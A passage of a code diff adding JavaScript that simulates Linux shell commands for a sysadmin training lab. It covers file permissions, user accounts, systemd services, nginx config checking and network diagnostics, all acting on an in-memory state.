+CMDS.mkdir=(c,a)=>{const o=pa(a,['m']);let code=0;
+  for(const f of o.pos){const p=P(c,f);if(node(c.S,p)){if(!o.f.has('p')){c.err.push("mkdir: cannot create directory '"+f+"': File exists");code=1;}continue;}
+    const chain=[];let q=p;while(!node(c.S,q)){chain.unshift(q);q=parentOf(q);}
+    if(chain.length>1&&!o.f.has('p')){c.err.push("mkdir: cannot create directory '"+f+"': No such file or directory");code=1;continue;}
+    for(const d of chain){if(!canCreate(c.S,c.user,d)){code=denied(c,"mkdir: cannot create directory '"+f+"': Permission denied");break;}
+      const U=c.S.users[c.user];mkd(c.S,d,{o:c.user,g:c.user==='root'?'root':(U&&U.pg)||c.user,m:o.v.m?parseInt(o.v.m,8):0o755});}}
+  return code;};
+function canDelete(S,user,p){if(user==='root')return true;const par=parentOf(p),pn=S.fs[par];if(!can(S,user,par,3))return false;if(pn.m&0o1000&&S.fs[p].o!==user&&pn.o!==user)return false;return true;}
+CMDS.rm=(c,a)=>{const o=pa(a);const rec=o.f.has('r')||o.f.has('R'),force=o.f.has('f');let code=0;
+  if(!o.pos.length){c.err.push('rm: missing operand');return 1;}
+  for(const f of o.pos){const p=P(c,f),n=node(c.S,p);
+    if(p==='/'||['/etc','/var','/home','/usr','/bin','/srv'].includes(p)){c.err.push("rm: refusing to remove '"+f+"'. That would wreck the server. The simulator blocks it.");code=1;continue;}
+    if(!n){if(!force){c.err.push("rm: cannot remove '"+f+"': No such file or directory");code=1;}continue;}
+    if(n.t==='d'&&!rec){c.err.push("rm: cannot remove '"+f+"': Is a directory");code=1;continue;}
+    if(!canDelete(c.S,c.user,p)){code=denied(c,"rm: cannot remove '"+f+"': Permission denied");continue;}
+    if(n.t==='d')descendants(c.S,p).forEach(k=>delete c.S.fs[k]);delete c.S.fs[p];
+    if(o.f.has('v'))c.out.push("removed '"+f+"'");}
+  return code;};
+CMDS.rmdir=(c,a)=>{let code=0;for(const f of a){const p=P(c,f),n=node(c.S,p);if(!n||n.t!=='d'){c.err.push("rmdir: failed to remove '"+f+"': No such file or directory");code=1;continue;}
+  if(children(c.S,p).length){c.err.push("rmdir: failed to remove '"+f+"': Directory not empty");code=1;continue;}if(!canDelete(c.S,c.user,p)){code=denied(c,"rmdir: failed to remove '"+f+"': Permission denied");continue;}delete c.S.fs[p];}return code;};
+function copyMove(c,a,move){const o=pa(a);if(o.pos.length<2){c.err.push((move?'mv':'cp')+': missing file operand');return 1;}
+  const dstArg=o.pos.pop();let dst=P(c,dstArg);const S=c.S;let code=0;
+  for(const s of o.pos){const sp=P(c,s),sn=node(S,sp);if(!sn){c.err.push((move?'mv':'cp')+": cannot stat '"+s+"': No such file or directory");code=1;continue;}
+    let tp=dst;if(node(S,dst)&&node(S,dst).t==='d')tp=J(dst,baseName(sp));
+    if(!can(S,c.user,sp,4)&&!move){code=denied(c,"cp: cannot open '"+s+"' for reading: Permission denied");continue;}
+    if(!canCreate(S,c.user,tp)&&!(node(S,tp)&&can(S,c.user,tp,2))||move&&!canDelete(S,c.user,sp)){code=denied(c,(move?'mv':'cp')+": cannot create '"+dstArg+"': Permission denied");continue;}
+    if(sn.t==='d'&&!move&&!o.f.has('r')&&!o.f.has('R')&&!o.f.has('a')){c.err.push("cp: -r not specified; omitting directory '"+s+"'");code=1;continue;}
+    const keys=[sp].concat(sn.t==='d'?descendants(S,sp):[]);
+    for(const k of keys){const nn=clone(S.fs[k]);if(!move){nn.o=c.user;nn.g=c.user==='root'?'root':((S.users[c.user]||{}).pg||c.user);}S.fs[tp+k.slice(sp.length)]=nn;if(move&&k!==tp+k.slice(sp.length))delete S.fs[k];}}
+  return code;}
+CMDS.cp=(c,a)=>copyMove(c,a,false);
+CMDS.mv=(c,a)=>copyMove(c,a,true);
+CMDS.stat=(c,a)=>{let code=0;for(const f of a.filter(x=>!x.startsWith('-'))){const p=P(c,f),n=node(c.S,p);if(!n){c.err.push("stat: cannot statx '"+f+"': No such file or directory");code=1;continue;}
+  const U=n.o==='root'?0:(c.S.users[n.o]||{}).uid;c.out.push('  File: '+f,'  Size: '+fsize(n)+'\t'+(n.t==='d'?'directory':'regular file'),'Access: (0'+octal(n.m)+'/'+modeStr(n)+')  Uid: ('+String(U).padStart(5)+'/'+n.o.padStart(8)+')   Gid: ('+String(gid(c.S,n.g)).padStart(5)+'/'+n.g.padStart(8)+')');}return code;};
+/* ----- permissions and ownership ----- */
+function applyMode(m,spec,isDir){
+  if(/^[0-7]{3,4}$/.test(spec))return parseInt(spec,8);
+  for(const part of spec.split(',')){const k=part.match(/^([ugoa]*)([+\-=])([rwxXst]*)$/);if(!k)return null;
+    const who=k[1]||'a';let b=0;for(const ch of k[3]){if(ch==='r')b|=4;if(ch==='w')b|=2;if(ch==='x'||(ch==='X'&&(isDir||m&0o111)))b|=1;}
+    const sh={u:6,g:3,o:0};const targets=who.includes('a')?['u','g','o']:who.split('');
+    for(const t of targets){const mask=7<<sh[t];const val=b<<sh[t];if(k[2]==='+')m|=val;else if(k[2]==='-')m&=~val;else m=(m&~mask)|val;}
+    if(k[3].includes('s')){if(who.includes('g')||who.includes('a'))k[2]==='-'?m&=~0o2000:m|=0o2000;if(who.includes('u'))k[2]==='-'?m&=~0o4000:m|=0o4000;}
+    if(k[3].includes('t'))k[2]==='-'?m&=~0o1000:m|=0o1000;}
+  return m;}
+function targetsR(c,files,rec){const r=[];for(const f of files){const p=P(c,f),n=node(c.S,p);if(!n){r.push({f,p,missing:true});continue;}r.push({f,p});if(rec&&n.t==='d')descendants(c.S,p).forEach(k=>r.push({f:k,p:k}));}return r;}
+CMDS.chmod=(c,a)=>{const rec=a.includes('-R');a=a.filter(x=>x!=='-R'&&x!=='-v'&&x!=='-c');const spec=a.shift();
+  if(!spec||!a.length){c.err.push('usage: chmod [-R] MODE FILE...   e.g. chmod 770 /srv/shared/billing or chmod g+w file');return 1;}let code=0;
+  for(const t of targetsR(c,a,rec)){if(t.missing){c.err.push("chmod: cannot access '"+t.f+"': No such file or directory");code=1;continue;}const n=node(c.S,t.p);
+    if(c.user!=='root'&&n.o!==c.user){code=denied(c,"chmod: changing permissions of '"+t.f+"': Operation not permitted");continue;}
+    const m=applyMode(n.m,spec,n.t==='d');if(m==null){c.err.push("chmod: invalid mode: '"+spec+"'");return 1;}n.m=m;}
+  return code;};
+function chownCore(c,a,cmd,groupOnly){const rec=a.includes('-R');a=a.filter(x=>x!=='-R'&&x!=='-v'&&x!=='-c'&&x!=='-h');const spec=a.shift();
+  if(!spec||!a.length){c.err.push(groupOnly?'usage: chgrp [-R] GROUP FILE...':'usage: chown [-R] USER[:GROUP] FILE...   e.g. chown -R root:billing /srv/shared/billing');return 1;}
+  let u=null,g=null;if(groupOnly)g=spec;else{const m=spec.split(/[:.]/);u=m[0]||null;g=m.length>1?(m[1]||(u&&(u==='root'?'root':(c.S.users[u]||{}).pg))||null):null;}
+  if(u&&u!=='root'&&!c.S.users[u]){c.err.push(cmd+": invalid user: '"+spec+"'");return 1;}
+  if(g&&c.S.groups[g]==null){c.err.push(cmd+": invalid group: '"+spec+"'");return 1;}
+  if(c.user!=='root'){c.err.push(cmd+": changing ownership of '"+a[0]+"': Operation not permitted");tip(c);return 1;}
+  let code=0;for(const t of targetsR(c,a,rec)){if(t.missing){c.err.push(cmd+": cannot access '"+t.f+"': No such file or directory");code=1;continue;}const n=node(c.S,t.p);if(u)n.o=u;if(g)n.g=g;}return code;}
+CMDS.chown=(c,a)=>chownCore(c,a,'chown',false);
+CMDS.chgrp=(c,a)=>chownCore(c,a,'chgrp',true);
+/* ----- identity ----- */
+function idLine(S,u){const uid=u==='root'?0:S.users[u].uid;const gs=userGroups(S,u);return 'uid='+uid+'('+u+') gid='+gid(S,gs[0])+'('+gs[0]+') groups='+gs.map(g=>gid(S,g)+'('+g+')').join(',');}
+CMDS.whoami=c=>{c.out.push(c.user);};
+CMDS.id=(c,a)=>{const u=a.filter(x=>!x.startsWith('-'))[0]||c.user;if(u!=='root'&&!c.S.users[u]){c.err.push("id: '"+u+"': no such user");return 1;}c.out.push(idLine(c.S,u));};
+CMDS.groups=(c,a)=>{if(!a.length){c.out.push(userGroups(c.S,c.user).join(' '));return 0;}let code=0;
+  for(const u of a){if(u!=='root'&&!c.S.users[u]){c.err.push("groups: '"+u+"': no such user");code=1;continue;}c.out.push(u+' : '+userGroups(c.S,u).join(' '));}return code;};
+CMDS.getent=(c,a)=>{const db=a[0],k=a[1];const t=node(c.S,'/etc/'+db);if(!t||(db!=='passwd'&&db!=='group')){c.err.push('getent: this simulator supports: getent passwd NAME, getent group NAME');return 1;}
+  const L=linesOf(t.c).filter(l=>!k||l.split(':')[0]===k);c.out.push(...L);return L.length?0:2;};
+/* ----- accounts ----- */
+function newUser(S,name,o){let uid=1000;for(const u in S.users)uid=Math.max(uid,S.users[u].uid);uid++;
+  if(S.groups[name]==null)S.groups[name]=uid;
+  S.users[name]=Object.assign({uid,pg:name,groups:[],gecos:'',home:'/home/'+name,shell:'/bin/sh',locked:false,pw:false,fails:[],mustChange:false},o||{});return S.users[name];}
+CMDS.useradd=(c,a)=>{if(needRoot(c,'useradd'))return 1;const o=pa(a,['G','s','c','g','d','u','p','e']);const name=o.pos[0];
+  if(!name){c.err.push('usage: useradd [-m] [-G group1,group2] [-s /bin/bash] [-c "Full Name"] USERNAME');return 2;}
+  if(!/^[a-z_][a-z0-9_-]*$/.test(name)){c.err.push("useradd: invalid user name '"+name+"'");return 3;}
+  if(c.S.users[name]||name==='root'){c.err.push("useradd: user '"+name+"' already exists");return 9;}
+  const G=o.v.G?o.v.G.split(',').filter(Boolean):[];for(const g of G)if(c.S.groups[g]==null){c.err.push("useradd: group '"+g+"' does not exist");return 6;}
+  const U=newUser(c.S,name,{groups:G,gecos:o.v.c||'',shell:o.v.s||'/bin/sh',home:o.v.d||'/home/'+name});
+  if(o.f.has('m')&&!node(c.S,U.home)){mkd(c.S,U.home,{o:name,g:name,m:0o755});mkf(c.S,U.home+'/.bashrc','# ~/.bashrc\n',{o:name,g:name});mkf(c.S,U.home+'/.profile','# ~/.profile\n',{o:name,g:name});}
+  return 0;};
+CMDS.adduser=(c,a)=>{c.info.push('adduser is an interactive helper on Ubuntu. In this lab use: sudo useradd -m -s /bin/bash -G group1,group2 USERNAME');return 1;};
+CMDS.usermod=(c,a)=>{if(needRoot(c,'usermod'))return 1;const o=pa(a,['G','s','c','g','d','l','e']);const name=o.pos[0];const U=c.S.users[name];
+  if(!name){c.err.push('usage: usermod -aG GROUP USERNAME');return 2;}if(!U){c.err.push("usermod: user '"+name+"' does not exist");return 6;}
+  if(o.v.G!=null){const G=o.v.G.split(',').filter(Boolean);for(const g of G)if(c.S.groups[g]==null){c.err.push("usermod: group '"+g+"' does not exist");return 6;}
+    if(o.f.has('a'))G.forEach(g=>{if(!U.groups.includes(g))U.groups.push(g);});else U.groups=G;}
+  else if(o.f.has('a')){c.err.push('usermod: -a flag is only allowed with the -G flag');return 2;}
+  if(o.v.s)U.shell=o.v.s;if(o.v.c!=null)U.gecos=o.v.c;if(o.f.has('L'))U.locked=true;if(o.f.has('U'))U.locked=false;return 0;};
+CMDS.userdel=(c,a)=>{if(needRoot(c,'userdel'))return 1;const o=pa(a);const name=o.pos[0];const U=c.S.users[name];if(!U){c.err.push("userdel: user '"+name+"' does not exist");return 6;}
+  if(o.f.has('r')&&node(c.S,U.home)){descendants(c.S,U.home).forEach(k=>delete c.S.fs[k]);delete c.S.fs[U.home];}delete c.S.users[name];return 0;};
+CMDS.groupadd=(c,a)=>{if(needRoot(c,'groupadd'))return 1;const g=a.filter(x=>!x.startsWith('-'))[0];if(!g){c.err.push('usage: groupadd GROUP');return 2;}
+  if(c.S.groups[g]!=null){c.err.push("groupadd: group '"+g+"' already exists");return 9;}let m=1000;for(const k in c.S.groups)m=Math.max(m,c.S.groups[k]);c.S.groups[g]=m+1;return 0;};
+CMDS.passwd=(c,a)=>{const o=pa(a);const me=c.user;const t=o.pos[0]||me;
+  if(t!==me&&c.user!=='root'){c.err.push('passwd: You may not view or modify password information for '+t+'.');tip(c);return 1;}
+  if(t!=='root'&&!c.S.users[t]){c.err.push("passwd: user '"+t+"' does not exist");return 1;}
+  const U=c.S.users[t]||{pw:true,locked:false,mustChange:false};
+  if(o.f.has('S')){c.out.push(t+' '+(U.locked?'L':U.pw?'P':'NP')+' 09/20/2026 0 99999 7 -1');return 0;}
+  if(o.f.has('l')){if(c.user!=='root')return needRoot(c,'passwd')?1:0;U.locked=true;c.out.push('passwd: password changed.');return 0;}
+  if(o.f.has('u')){if(c.user!=='root')return needRoot(c,'passwd')?1:0;U.locked=false;c.out.push('passwd: password changed.');return 0;}
+  if(o.f.has('e')){if(c.user!=='root')return needRoot(c,'passwd')?1:0;U.mustChange=true;c.out.push('passwd: password expiry information changed.');return 0;}
+  if(o.f.has('d')){U.pw=false;c.out.push('passwd: password changed.');return 0;}
+  U.pw=true;U.mustChange=false;c.out.push('New password: ','Retype new password: ','passwd: password updated successfully');
+  c.info.push('(Simulated: on a real system you type the password twice and nothing shows while you type. Setting a password also clears any "must change at next login" flag.)');return 0;};
+CMDS.chage=(c,a)=>{const o=pa(a,['d','M','m','W','E','I']);const t=o.pos[0];const U=c.S.users[t];
+  if(!t){c.err.push('usage: chage -d 0 USERNAME   or   chage -l USERNAME');return 2;}
+  if(!U){c.err.push("chage: user '"+t+"' does not exist in /etc/passwd");return 1;}
+  if(o.f.has('l')){if(c.user!=='root'&&t!==c.user)return needRoot(c,'chage')?1:0;const w=U.mustChange?'password must be changed':'Sep 20, 2026';const ex=U.mustChange?'password must be changed':'never';
+    c.out.push('Last password change                                    : '+w,'Password expires                                        : '+ex,'Password inactive                                       : '+ex,'Account expires                                         : never','Minimum number of days between password change          : 0','Maximum number of days between password change          : 99999','Number of days of warning before password expires      : 7');return 0;}
+  if(needRoot(c,'chage'))return 1;
+  if(o.v.d!=null)U.mustChange=String(o.v.d)==='0';return 0;};
+CMDS.faillock=(c,a)=>{const o=pa(a,['user','dir']);if(needRoot(c,'faillock'))return 1;const S=c.S;
+  const list=o.v.user?[o.v.user]:Object.keys(S.users);
+  if(o.v.user&&!S.users[o.v.user]){c.err.push('faillock: Unknown user: '+o.v.user);return 1;}
+  if(o.f.has('reset')){list.forEach(u=>{S.users[u].fails=[];});return 0;}
+  for(const u of list){const U=S.users[u];if(!o.v.user&&!U.fails.length)continue;c.out.push(u+':','When                Type  Source                                           Valid');
+    U.fails.forEach(f=>c.out.push(f.when+' RHOST '+f.src.padEnd(48)+' V'));}
+  return 0;};
+/* ----- clock ----- */
+function ts(S){S.tick=(S.tick||0)+7;const s=14*3600+20*60+S.tick;const p=n=>String(n).padStart(2,'0');return 'Sep 27 '+p(Math.floor(s/3600)%24)+':'+p(Math.floor(s/60)%60)+':'+p(s%60);}
+function jlog(S,svc,proc,msg){(S.journal[svc]=S.journal[svc]||[]).push(ts(S)+' '+S.host+' '+proc+': '+msg);}
+/* ----- validators (config checks) ----- */
+const NGX_OK=['listen','server_name','root','index','try_files','access_log','error_log','proxy_pass','proxy_set_header','return','include','client_max_body_size','add_header','ssl_certificate','ssl_certificate_key','gzip','sendfile','keepalive_timeout','worker_processes','worker_connections','user','pid','charset','default_type','error_page','expires','alias','deny','allow','rewrite','autoindex'];
+const NGX_BLOCK=['server','location','http','events','upstream','if','map'];
+const VALIDATORS={nginx(S){
+  const files=['/etc/nginx/nginx.conf'].concat(children(S,'/etc/nginx/sites-enabled').map(x=>'/etc/nginx/sites-enabled/'+x));
+  for(const f of files){const n=S.fs[f];if(!n)return 'open() "'+f+'" failed (2: No such file or directory)';let depth=0;const L=n.c.split('\n');
+    for(let i=0;i<L.length;i++){let l=L[i].replace(/#.*/,'').trim();if(!l)continue;
+      if(l==='}'){depth--;if(depth<0)return 'unexpected "}" in '+f+':'+(i+1);continue;}
+      const name=l.split(/\s+/)[0].replace(/[;{]$/,'');
+      if(l.endsWith('{')){if(!NGX_BLOCK.includes(name))return 'unknown directive "'+name+'" in '+f+':'+(i+1);depth++;continue;}
+      if(!NGX_OK.includes(name))return 'unknown directive "'+name+'" in '+f+':'+(i+1);
+      if(!l.endsWith(';'))return 'directive "'+name+'" is not terminated by ";" in '+f+':'+(i+2>L.length?i+1:i+2);}
+    if(depth>0)return 'unexpected end of file, expecting "}" in '+f+':'+L.length;}
+  return null;}};
+/* ----- services ----- */
+function svcName(x){return (x||'').replace(/\.service$/,'');}
+function startSvc(c,s,name){const S=c.S;const err=s.validate?VALIDATORS[s.validate](S):null;
+  jlog(S,name,'systemd[1]','Starting '+name+'.service - '+s.desc+'...');
+  if(err){s.active=false;s.failed=true;s.pid=null;jlog(S,name,name+'['+(4000+S.tick)+']',name+': [emerg] '+err);jlog(S,name,'systemd[1]',name+'.service: Control process exited, code=exited, status=1/FAILURE');jlog(S,name,'systemd[1]',name+'.service: Failed with result \'exit-code\'.');jlog(S,name,'systemd[1]','Failed to start '+name+'.service - '+s.desc+'.');
+    c.err.push('Job for '+name+'.service failed because the control process exited with error code.','See "systemctl status '+name+'.service" and "journalctl -xeu '+name+'.service" for details.');return 1;}
+  s.active=true;s.failed=false;s.pid=4100+(S.tick%800);jlog(S,name,'systemd[1]','Started '+name+'.service - '+s.desc+'.');return 0;}
+CMDS.systemctl=(c,a)=>{const S=c.S;const o=pa(a);const sub=o.pos[0];const name=svcName(o.pos[1]);
+  if(!sub||sub==='list-units'||o.f.has('failed')||sub==='--failed'){const fl=o.f.has('failed')||a.includes('--failed');c.out.push('  UNIT                 LOAD   ACTIVE   SUB     DESCRIPTION');
+    for(const k in S.services){const s=S.services[k];if(fl&&!s.failed)continue;c.out.push((s.failed?'\u25cf ':'  ')+(k+'.service').padEnd(20)+' loaded '+(s.active?'active  ':s.failed?'failed  ':'inactive')+' '+(s.active?'running':s.failed?'failed ':'dead   ')+' '+s.desc);}return 0;}
+  if(sub==='daemon-reload'){return needRoot(c,'systemctl')?1:0;}
+  const s=S.services[name];
+  if(!name){c.err.push('Too few arguments. Example: systemctl status nginx');return 1;}
+  if(!s){c.err.push(sub==='status'?'Unit '+name+'.service could not be found.':'Failed to '+sub+' '+name+'.service: Unit '+name+'.service not found.');return sub==='status'?4:5;}
+  if(sub==='status'){const st=s.active?'active (running) since Sun 2026-09-27 '+(s.since||'08:00:03')+' CDT':s.failed?'failed (Result: exit-code) since Sun 2026-09-27 '+(s.since||'08:02:11')+' CDT':'inactive (dead)';
+    c.out.push((s.active?'\u25cf ':'\u00d7 ')+name+'.service - '+s.desc,'     Loaded: loaded (/lib/systemd/system/'+name+'.service; '+(s.enabled===false?'disabled':'enabled')+'; preset: enabled)','     Active: '+st);
+    if(s.active&&s.pid)c.out.push('   Main PID: '+s.pid+' ('+(s.proc||name)+')');c.out.push('');c.out.push(...(S.journal[name]||[]).slice(-6));return s.active?0:3;}
+  if(sub==='is-active'){c.out.push(s.active?'active':s.failed?'failed':'inactive');return s.active?0:3;}
+  if(sub==='is-enabled'){c.out.push(s.enabled===false?'disabled':'enabled');return 0;}
+  if(needRoot(c,'systemctl'))return 1;
+  if(sub==='start'||sub==='restart'||sub==='reload'){if(sub==='start'&&s.active)return 0;if(s.active){jlog(S,name,'systemd[1]','Stopping '+name+'.service...');}return startSvc(c,s,name);}
+  if(sub==='stop'){s.active=false;s.failed=false;s.pid=null;jlog(S,name,'systemd[1]','Stopped '+name+'.service.');return 0;}
+  if(sub==='enable'){s.enabled=true;c.out.push('Created symlink /etc/systemd/system/multi-user.target.wants/'+name+'.service.');return 0;}
+  if(sub==='disable'){s.enabled=false;c.out.push('Removed /etc/systemd/system/multi-user.target.wants/'+name+'.service.');return 0;}
+  c.err.push('Unknown command verb '+sub+'. Try status, start, stop, restart, enable, disable.');return 1;};
+CMDS.service=(c,a)=>CMDS.systemctl(c,[a[1],a[0]]);
+CMDS.journalctl=(c,a)=>{const o=pa(a,['u','n','p','since','priority']);const S=c.S;let L;
+  if(o.v.u){L=(S.journal[svcName(o.v.u)]||[]).slice();}else{L=[];for(const k in S.journal)L.push(...S.journal[k]);L.sort();}
+  const n=o.v.n!=null?parseInt(o.v.n,10):(o.f.has('e')?40:null);if(n)L=L.slice(-n);
+  if(!L.length){c.out.push('-- No entries --');return 0;}c.out.push(...L);if(o.f.has('f'))c.info.push('(journalctl -f follows live on a real system. The simulator shows current entries.)');};
+CMDS.nginx=(c,a)=>{if(!a.includes('-t')){c.info.push('Use nginx -t to test the configuration, and systemctl to start or restart the service.');return 1;}
+  if(!c.S.fs['/etc/nginx/nginx.conf']){c.err.push('nginx: command not found');return 127;}
+  const e=VALIDATORS.nginx(c.S);if(e){c.err.push('nginx: [emerg] '+e,'nginx: configuration file /etc/nginx/nginx.conf test failed');return 1;}
+  c.err.push('nginx: the configuration file /etc/nginx/nginx.conf syntax is ok','nginx: configuration file /etc/nginx/nginx.conf test is successful');return 0;};
+/* ----- network ----- */
+function parseHosts(S){const m={};const n=S.fs['/etc/hosts'];if(!n)return m;for(const l of n.c.split('\n')){const x=l.replace(/#.*/,'').trim().split(/\s+/);if(x.length<2)continue;for(const h of x.slice(1))if(!(h in m))m[h.toLowerCase()]=x[0];}return m;}
+function nameservers(S){const n=S.fs['/etc/resolv.conf'];if(!n)return [];return n.c.split('\n').map(l=>l.replace(/#.*/,'').trim().split(/\s+/)).filter(x=>x[0]==='nameserver'&&x[1]).map(x=>x[1]);}
+function isIp(h){return /^\d+\.\d+\.\d+\.\d+$/.test(h);}
+function dnsQuery(S,name,server){const N=S.net;name=name.toLowerCase().replace(/\.$/,'');const servers=server?[server]:nameservers(S);
+  if(!servers.length)return {err:'timeout'};for(const sv of servers){const z=N.dns[sv];if(!z)continue;const zone=z==='internal'?Object.assign({},N.pub,N.internal):N.pub;
+    return zone[name]?{ip:zone[name],server:sv,auth:z==='internal'&&!!N.internal[name]}:{err:'nx',server:sv};}
+  return {err:'timeout',server:servers[0]};}
+function resolveHost(S,h){h=h.toLowerCase();if(isIp(h))return {ip:h};const hm=parseHosts(S);if(hm[h])return {ip:hm[h],hosts:true};return dnsQuery(S,h);}
+function hostInfo(S,ip){if(ip==='127.0.0.1'||ip===S.net.myip)return {ping:true,local:true};return S.net.alive[ip]||null;}
+CMDS.ping=(c,a)=>{const o=pa(a,['c','W','i','w']);const h=o.pos[0];if(!h){c.err.push('ping: usage error: Destination address required');return 1;}
+  const cnt=Math.min(parseInt(o.v.c||'4',10)||4,10);const r=resolveHost(c.S,h);
+  if(!r.ip){c.err.push('ping: '+h+': '+(r.err==='timeout'?'Temporary failure in name resolution':'Name or service not known'));return 2;}
+  const hi=hostInfo(c.S,r.ip);c.out.push('PING '+h+' ('+r.ip+') 56(84) bytes of data.');
+  if(!hi||!hi.ping){for(let i=1;i<cnt;i++)c.out.push('From '+c.S.net.myip+' icmp_seq='+i+' Destination Host Unreachable');c.out.push('','--- '+h+' ping statistics ---',cnt+' packets transmitted, 0 received, +'+(cnt-1)+' errors, 100% packet loss, time '+(cnt*1000+60)+'ms');return 1;}
+  const base=hi.local?0.04:(hi.ms||0.6);const t=[];for(let i=1;i<=cnt;i++){const v=(base*(0.8+((i*37)%10)/25)).toFixed(base<1?3:1);t.push(+v);c.out.push('64 bytes from '+(isIp(h)?h:h+' ('+r.ip+')')+': icmp_seq='+i+' ttl='+(hi.ttl||64)+' time='+v+' ms');}
+  c.out.push('','--- '+h+' ping statistics ---',cnt+' packets transmitted, '+cnt+' received, 0% packet loss, time '+(cnt*1000-996)+'ms','rtt min/avg/max/mdev = '+Math.min(...t)+'/'+(t.reduce((x,y)=>x+y,0)/cnt).toFixed(base<1?3:1)+'/'+Math.max(...t)+'/0.071 ms');return 0;};
+CMDS.nslookup=(c,a)=>{const h=a.filter(x=>!x.startsWith('-'))[0];if(!h){c.err.push('usage: nslookup NAME [SERVER]');return 1;}const sv=a.filter(x=>!x.startsWith('-'))[1];
+  const r=dnsQuery(c.S,h,sv);if(r.err==='timeout'){c.out.push(';; connection timed out; no servers could be reached');return 1;}
+  c.out.push('Server:\t\t'+r.server,'Address:\t'+r.server+'#53','');
+  if(r.err==='nx'){c.out.push("** server can't find "+h+': NXDOMAIN');return 1;}
+  if(!r.auth)c.out.push('Non-authoritative answer:');c.out.push('Name:\t'+h,'Address: '+r.ip);c.info.push('Note: nslookup asks the DNS server directly. It does not read /etc/hosts, but ping, curl and browsers do.');return 0;};
+CMDS.host=(c,a)=>{const r=dnsQuery(c.S,a[0]||'');if(r.ip){c.out.push(a[0]+' has address '+r.ip);return 0;}c.out.push(r.err==='nx'?'Host '+a[0]+' not found: 3(NXDOMAIN)':';; connection timed out; no servers could be reached');return 1;};
+CMDS.dig=(c,a)=>{const sv=(a.find(x=>x.startsWith('@'))||'').slice(1)||undefined;const h=a.find(x=>!x.startsWith('@')&&!x.startsWith('+')&&!x.startsWith('-'));const r=dnsQuery(c.S,h||'',sv);
+  if(a.includes('+short')){if(r.ip)c.out.push(r.ip);return r.ip?0:1;}
+  if(r.err==='timeout'){c.out.push(';; communications error: timed out','; no servers could be reached');return 9;}
+  c.out.push(';; HEADER status: '+(r.ip?'NOERROR':'NXDOMAIN'),'',';; ANSWER SECTION:');if(r.ip)c.out.push(h+'.\t\t300\tIN\tA\t'+r.ip);c.out.push('',';; SERVER: '+r.server+'#53('+r.server+') (UDP)');return 0;};
+CMDS.curl=(c,a)=>{const o=pa(a,['o','m','X','H','d','w','A']);const url=o.pos[0];if(!url){c.err.push("curl: try 'curl http://ehr.westside.local' or 'curl -I URL' for headers only");return 2;}
+  const m=url.match(/^(?:(https?):\/\/)?([^\/:]+)(?::(\d+))?(\/.*)?$/);if(!m){c.err.push('curl: (3) URL rejected: Malformed input to a URL function');return 3;}
+  const host=m[2],port=m[3]||(m[1]==='https'?'443':'80');const r=resolveHost(c.S,host);
+  if(!r.ip){c.err.push('curl: (6) Could not resolve host: '+host);return 6;}
+  const hi=hostInfo(c.S,r.ip);let page=null;
+  if(hi&&hi.local){for(const k in c.S.services){const s=c.S.services[k];if(s.active&&s.page&&(s.ports||[]).includes(+port))page=s.page;}if(!page){c.err.push('curl: (7) Failed to connect to '+host+' port '+port+' after 0 ms: Couldn\'t connect to server');return 7;}}
+  else if(!hi){c.err.push('curl: (28) Failed to connect to '+host+' port '+port+' after 3002 ms: No route to host');return 28;}
+  else if(!hi.http){c.err.push('curl: (7) Failed to connect to '+host+' port '+port+' after 2 ms: Couldn\'t connect to server');return 7;}
+  else page=hi.http;
+  if(o.f.has('I'))c.out.push('HTTP/1.1 200 OK','Server: nginx','Content-Type: text/html; charset=utf-8','Connection: keep-alive');else c.out.push(...linesOf(page));return 0;};
+CMDS.wget=(c,a)=>{c.info.push('wget is not in this simulator. Use curl URL instead.');return 1;};
+CMDS.ip=(c,a)=>{const N=c.S.net;if(a[0]&&/^r/.test(a[0])){c.out.push('default via '+N.gw+' dev eth0 proto dhcp metric 100',N.myip.replace(/\.\d+$/,'.0')+'/24 dev eth0 proto kernel scope link src '+N.myip);return 0;}
+  c.out.push('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN','    inet 127.0.0.1/8 scope host lo','2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP','    link/ether 52:54:00:3a:91:0c brd ff:ff:ff:ff:ff:ff','    inet '+N.myip+'/24 brd '+N.myip.replace(/\.\d+$/,'.255')+' scope global eth0');};
+CMDS.ifconfig=(c,a)=>CMDS.ip(c,['a']);
+CMDS.hostname=c=>{c.out.push(c.S.host);};
+function listeners(S){const r=[];for(const k in S.services){const s=S.services[k];if(s.active)(s.ports||[]).forEach(p=>r.push({addr:'0.0.0.0:'+p,proc:s.proc||k,pid:s.pid||800}));}
+  S.procs.forEach(p=>{if(p.listen)r.push({addr:p.listen,proc:p.name||p.cmd.split(/[\s/]/).filter(Boolean).pop(),pid:p.pid});});return r;}
+CMDS.ss=(c,a)=>{const showP=a.join('').includes('p');c.out.push('State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  '+(showP?'Process':''));
+  listeners(c.S).forEach(l=>c.out.push('LISTEN  0       511    '+l.addr.padStart(17)+'          0.0.0.0:*     '+(showP?'users:(("'+l.proc+'",pid='+l.pid+',fd=6))':'')));
+  if(showP&&c.user!=='root')c.info.push('Tip: on a real server, sudo ss -tlnp is needed to see process names for sockets owned by root.');};
+CMDS.netstat=CMDS.ss;
+/* ----- processes ----- */
+CMDS.ps=(c,a)=>{const S=c.S;const ef=a.join(' ').includes('e')&&a.join(' ').includes('f')&&!a.join('').includes('aux');
+  if(!a.length){c.out.push('    PID TTY          TIME CMD','   1402 pts/0    00:00:00 bash','   '+(9000+S.tick)+' pts/0    00:00:00 ps');return 0;}
+  if(ef){c.out.push('UID          PID    PPID  C STIME TTY          TIME CMD');S.procs.forEach(p=>c.out.push(p.user.padEnd(8)+String(p.pid).padStart(8)+String(p.ppid||1).padStart(8)+String(Math.round(p.cpu)).padStart(3)+' '+(p.start||'08:00')+' '+(p.tty||'?').padEnd(12)+' '+(p.time||'00:00:01')+' '+p.cmd));return 0;}
+  c.out.push('USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND');
+  S.procs.forEach(p=>c.out.push(p.user.padEnd(10)+String(p.pid).padStart(5)+String(p.cpu.toFixed(1)).padStart(5)+String(p.mem.toFixed(1)).padStart(5)+String(p.vsz||16800).padStart(7)+String(p.rss||5200).padStart(6)+' '+(p.tty||'?').padEnd(8)+' '+(p.stat||'Ss').padEnd(4)+' '+(p.start||'08:00')+'   '+(p.time||'0:01')+' '+p.cmd));
